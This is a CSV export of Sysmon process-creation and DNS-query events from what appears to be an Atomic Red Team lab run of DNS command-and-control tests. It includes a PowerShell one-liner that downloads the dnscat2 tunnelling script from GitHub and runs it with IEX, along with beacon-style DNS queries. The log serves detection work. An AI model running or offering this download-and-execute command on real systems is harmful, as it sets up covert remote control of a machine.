"2025-12-26 11:29:08.444 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174863,"Cmdline: C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7295_none_a53f7c7777395343\TiWorker.exe -Embedding ¦ Proc: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7295_none_a53f7c7777395343\TiWorker.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 10168 ¦ PGUID: E9F06A57-6374-694E-5702-000000002400 ¦ ParentPID: 912 ¦ ParentPGUID: E9F06A57-5FE0-694E-0D00-000000002400 ¦ Description: Windows Modules Installer Worker ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=4060AE32B15C7317E981344C78FAADE8,SHA256=31D7BB3C8EEFBA3DB399E03A8D978D496AF3686E302B5E0CC5B0D7476F757AC5,IMPHASH=476E367A444988F01FF5A86D130F2F41","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.7295 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: TiWorker.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:29:08.430","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:27.340 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175204,"Cmdline: C:\WINDOWS\system32\reg.exe query ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe"" --type=utility --utility-sub-type=node.mojom.NodeService --lang=de --service-sandbox-type=none --dns-result-order=ipv4first --experimental-network-inspection --inspect-port=0 --user-data-dir=""C:\Users\student\AppData\Roaming\Code"" --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --code-cache-schemes=vscode-webview,vscode-file --field-trial-handle=1756,i,13909546815793540407,742986334349722843,262144 --enable-features=DocumentPolicyIncludeJSCallStacksInCrashReports,EarlyEstablishGpuChannel,EnableTransparentHwndEnlargement,EstablishGpuChannelAsync --disable-features=CalculateNativeWinOcclusion,LocalNetworkAccessChecks,ScreenAIOCREnabled,SpareRendererForSitePerProcess,TraceSiteInstanceGetProcessCreation --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=3824 /prefetch:14 ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 9888 ¦ PGUID: E9F06A57-6387-694E-5802-000000002400 ¦ ParentPID: 2512 ¦ ParentPGUID: E9F06A57-6241-694E-E901-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:29:27.318","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:27.738 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175205,"Cmdline: C:\WINDOWS\system32\cmd.exe /d /s /c """"c:\Users\student\AppData\Roaming\Code\User\globalStorage\ms-dotnettools.vscode-dotnet-runtime\.dotnet\9.0.11~x64~aspnetcore\dotnet.exe"" --list-runtimes --arch x64"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe"" --type=utility --utility-sub-type=node.mojom.NodeService --lang=de --service-sandbox-type=none --dns-result-order=ipv4first --experimental-network-inspection --inspect-port=0 --user-data-dir=""C:\Users\student\AppData\Roaming\Code"" --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --code-cache-schemes=vscode-webview,vscode-file --field-trial-handle=1756,i,13909546815793540407,742986334349722843,262144 --enable-features=DocumentPolicyIncludeJSCallStacksInCrashReports,EarlyEstablishGpuChannel,EnableTransparentHwndEnlargement,EstablishGpuChannelAsync --disable-features=CalculateNativeWinOcclusion,LocalNetworkAccessChecks,ScreenAIOCREnabled,SpareRendererForSitePerProcess,TraceSiteInstanceGetProcessCreation --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=3824 /prefetch:14 ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 6564 ¦ PGUID: E9F06A57-6387-694E-5A02-000000002400 ¦ ParentPID: 2512 ¦ ParentPGUID: E9F06A57-6241-694E-E901-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: c:\Users\student\.vscode\extensions\ms-dotnettools.vscode-dotnet-runtime-3.0.0\dist\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\student\AppData\Local\Programs\Microsoft VS Code\Code.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:29:27.723","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:27.862 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175206,"Cmdline: ""c:\Users\student\AppData\Roaming\Code\User\globalStorage\ms-dotnettools.vscode-dotnet-runtime\.dotnet\9.0.11~x64~aspnetcore\dotnet.exe"" --list-runtimes --arch x64 ¦ Proc: C:\Users\student\AppData\Roaming\Code\User\globalStorage\ms-dotnettools.vscode-dotnet-runtime\.dotnet\9.0.11~x64~aspnetcore\dotnet.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\system32\cmd.exe /d /s /c """"c:\Users\student\AppData\Roaming\Code\User\globalStorage\ms-dotnettools.vscode-dotnet-runtime\.dotnet\9.0.11~x64~aspnetcore\dotnet.exe"" --list-runtimes --arch x64"" ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 8960 ¦ PGUID: E9F06A57-6387-694E-5C02-000000002400 ¦ ParentPID: 6564 ¦ ParentPGUID: E9F06A57-6387-694E-5A02-000000002400 ¦ Description: .NET Host ¦ Product: .NET ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A9717ADAFD14F14F9830F78D38015492,SHA256=65F08E5F087EF76325A019B13159DDEDAC551BB23827AE552F806A818ACBEE78,IMPHASH=C677745A517E0584ABC039899987A8B7","CurrentDirectory: c:\Users\student\.vscode\extensions\ms-dotnettools.vscode-dotnet-runtime-3.0.0\dist\ ¦ FileVersion: 9,0,1125,51716 @Commit: fa7cdded37981a97cec9a3e233c4a6af58a91c57 ¦ IntegrityLevel: Medium ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:29:27.845","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:49.596 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175218,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:29:49.557","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:09.895 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175445,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:09.651","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:15.658 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175453,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8044 ¦ PGUID: E9F06A57-63B7-694E-6102-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:15.591","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.193 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175454,"Cmdline: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\student\AppData\Local\Temp\RES3271.tmp"" ""c:\Users\student\AppData\Local\Temp\3stwtxwi\CSC9ADCE58EFE09453CAF2A5FFEBDBD36BC.TMP"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.cmdline"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7972 ¦ PGUID: E9F06A57-63B8-694E-6202-000000002400 ¦ ParentPID: 8044 ¦ ParentPGUID: E9F06A57-63B7-694E-6102-000000002400 ¦ Description: Microsoft® Resource File To COFF Object Conversion Utility ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 14.32.31326.0 ¦ IntegrityLevel: High ¦ OriginalFileName: CVTRES.EXE ¦ ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.181","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.471 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175458,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9588 ¦ PGUID: E9F06A57-63B8-694E-6302-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.424","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.585 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175459,"Cmdline: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\student\AppData\Local\Temp\RES3407.tmp"" ""c:\Users\student\AppData\Local\Temp\v5tccl0z\CSC3019F68469404FD6A8B5A5BC71B7DF4.TMP"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.cmdline"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2068 ¦ PGUID: E9F06A57-63B8-694E-6402-000000002400 ¦ ParentPID: 9588 ¦ ParentPGUID: E9F06A57-63B8-694E-6302-000000002400 ¦ Description: Microsoft® Resource File To COFF Object Conversion Utility ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 14.32.31326.0 ¦ IntegrityLevel: High ¦ OriginalFileName: CVTRES.EXE ¦ ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.573","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.902 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175461,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7460 ¦ PGUID: E9F06A57-63B8-694E-6502-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.889","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:17.472 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",175462,"Cmdline: ""C:\WINDOWS\system32\nslookup.exe"" ¦ Proc: C:\Windows\System32\nslookup.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6592 ¦ PGUID: E9F06A57-63B9-694E-6602-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: nslookup ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=10FAC41C9075D456ABFBA9CD17C9A177,SHA256=123EF423B3B4623C02D60C683F5C0BCFEF232400A625FC172B7FAB04A97EB677,IMPHASH=EC3E3C718C086FAB4F7F35008A5E9116","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nslookup.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:17.464","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174831,"Query: atomicredteam-284911.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.903 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174832,"Query: atomicredteam-542239.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.189","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.904 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174833,"Query: atomicredteam-579678.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.228","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.904 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174834,"Query: atomicredteam-105909.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.267","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.904 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174835,"Query: atomicredteam-874128.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.306","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.904 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174836,"Query: atomicredteam-815301.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.623","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:45.904 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174837,"Query: atomicredteam-42258.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.792","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:46.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174838,"Query: atomicredteam-35356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:45.830","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
